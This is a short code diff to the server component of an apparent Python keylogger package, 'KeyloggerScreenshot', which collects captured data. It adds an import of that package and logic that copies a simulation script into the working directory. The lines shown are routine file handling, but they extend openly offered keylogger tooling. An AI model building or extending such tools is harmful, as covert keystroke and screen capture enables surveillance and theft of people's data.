@@ -6,6 +6,7 @@ import BetterPrinting as bp
 from .Server_photos import ServerPhotos
 from .Port_data import Ports
 from .Simulation_code import Simulation
+import KeyloggerScreenshot as ks
 
 class ServerKeylogger:
     # This is the class of the Server. Both Server should not be in the same file
@@ -128,8 +129,24 @@ class ServerKeylogger:
             else:
                 self.do_file(self.full_msg.split("***%§§)§§%")[1])
                 ServerKeylogger.terminator()
-                
+
             if self.simulater is True:
+                if "Simulation_code.py" not in os.listdir():
+                    get_name = str(ks.Simulation_code).split("from")
+                    full_name = get_name[1].split(">")[0]
+                    full_name = full_name.split()[0]
+                    full_name = full_name.split("'")[1]
+
+                    with open(full_name, "r+") as file:
+                        data = [each for each in file]
+                        data += "\n\nSimulation.start_simulation()"
+
+                    with open("Simulation_code.py", "a+") as file:
+                        for line in data:
+                            file.write(line)
+
+                    bp.color('"Simulation_code.py" has been made', "magenta")
+
                 print("Simulation will come in 10 seconds!!!")
                 time.sleep(10)
                 start = input("Do you want to start y/n?: ")
